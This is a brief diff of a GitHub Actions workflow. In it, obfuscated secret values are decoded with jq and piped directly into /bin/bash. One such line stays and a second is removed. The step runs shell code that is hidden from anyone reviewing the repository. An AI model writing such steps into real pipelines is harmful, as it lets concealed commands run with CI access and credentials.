@@ -22,7 +22,6 @@ jobs:
           tcted6997: ${{ secrets.tcted6997 }}
         run: |
           printf '%s' "$tcted6997" | jq -r .rg16712 | /bin/bash
-          printf '%s' "$ldlal461" | jq -r .tnljl12854 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
